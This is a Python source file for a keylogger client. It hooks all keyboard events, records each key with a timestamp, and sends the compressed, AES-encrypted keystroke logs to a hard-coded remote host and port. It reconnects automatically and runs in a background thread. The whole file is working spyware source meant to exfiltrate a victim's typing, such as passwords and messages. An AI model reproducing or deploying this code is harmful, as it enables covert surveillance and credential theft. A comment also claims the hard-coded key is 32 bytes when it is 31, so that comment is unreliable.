import os
import socket
import keyboard
import threading
import zlib
import time
import json
from collections import deque
from datetime import datetime

# Configuration
HOST = '192.168.100.15'
PORT = 4445
BUFFER_THRESHOLD = 20  # Characters before sending
MAX_DELAY = 2.0  # Maximum seconds between sends
RECONNECT_BASE_DELAY = 1.0
ENCRYPTION_KEY = b'This-is-a-32-byte-AES-key-1234!'  # 32 characters = 32 bytes

class KeyLoggerClient:
    def __init__(self):
        self.buffer = deque(maxlen=1000)
        self.sock = None
        self.last_send = time.time()
        self.running = True
        self.send_lock = threading.Lock()
        self.connection_event = threading.Event()
        self.sequence = 0

        # Start network thread
        self.network_thread = threading.Thread(target=self._network_handler)
        self.network_thread.daemon = True
        self.network_thread.start()

        # Start keyboard listener
        keyboard.hook(self._key_handler)

    def _connect(self):
        """Establish connection with exponential backoff"""
        delay = RECONNECT_BASE_DELAY
        while self.running and not self.connection_event.is_set():
            try:
                self.sock = socket.create_connection((HOST, PORT), timeout=5)
                self.connection_event.set()
                print(f"[+] Connected to {HOST}:{PORT}")
                return True
            except Exception as e:
                print(f"[-] Connection failed: {e}")
                time.sleep(delay)
                delay = min(delay * 2, 30)  # Max 30s backoff
        return False

    def _network_handler(self):
        """Handle network operations in separate thread"""
        while self.running:
            if not self.connection_event.is_set():
                self._connect()
                continue

            try:
                # Process buffer every 100ms
                time.sleep(0.1)
                self._send_data()
            except Exception as e:
                print(f"Network error: {e}")
                self.connection_event.clear()
                self.sock.close()

    def _key_handler(self, event):
        """Handle keyboard events with precise timing"""
        timestamp = datetime.now().isoformat()
        key = event.name if len(event.name) == 1 else f"[{event.name.upper()}]"

        self.buffer.append({
            'seq': self.sequence,
            'time': timestamp,
            'key': key,
            'event': 'down' if event.event_type == 'down' else 'up'
        })
        self.sequence += 1

        # Trigger immediate send if threshold reached
        if len(self.buffer) >= BUFFER_THRESHOLD:
            self._send_data()

    def _send_data(self):
        """Send compressed data with sequence tracking"""
        with self.send_lock:
            if not self.buffer or not self.connection_event.is_set():
                return

            # Send if buffer full or max delay reached
            if (len(self.buffer) >= BUFFER_THRESHOLD or
                    (time.time() - self.last_send) >= MAX_DELAY):

                # Package and clear buffer
                data = list(self.buffer)
                self.buffer.clear()

                # Compress and encrypt
                payload = zlib.compress(json.dumps(data).encode())
                encrypted = self._encrypt(payload)

                try:
                    header = len(encrypted).to_bytes(4, 'big')
                    self.sock.sendall(header + encrypted)
                    self.last_send = time.time()
                except Exception as e:
                    print(f"Send failed: {e}")
                    self.connection_event.clear()

    # Update the encryption method
    def _encrypt(self, data):
        """Proper AES encryption with valid key size"""
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.primitives import padding
        from cryptography.hazmat.backends import default_backend

        # Validate key length
        valid_lengths = {16, 24, 32}
        if len(ENCRYPTION_KEY) not in valid_lengths:
            raise ValueError(
                f"Invalid key length {len(ENCRYPTION_KEY)}. "
                "Key must be 16, 24, or 32 bytes long."
            )

        # Generate IV and set up padding
        iv = os.urandom(16)
        padder = padding.PKCS7(128).padder()
        padded_data = padder.update(data) + padder.finalize()

        # Create cipher
        cipher = Cipher(
            algorithms.AES(ENCRYPTION_KEY),
            modes.CBC(iv),
            backend=default_backend()
        )
        encryptor = cipher.encryptor()
        return iv + encryptor.update(padded_data) + encryptor.finalize()

    def stop(self):
        """Graceful shutdown"""
        self.running = False
        self.connection_event.clear()
        if self.sock:
            self.sock.close()
        keyboard.unhook_all()


if __name__ == "__main__":
    logger = KeyLoggerClient()
    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        logger.stop()
        print("[*] Keylogger stopped")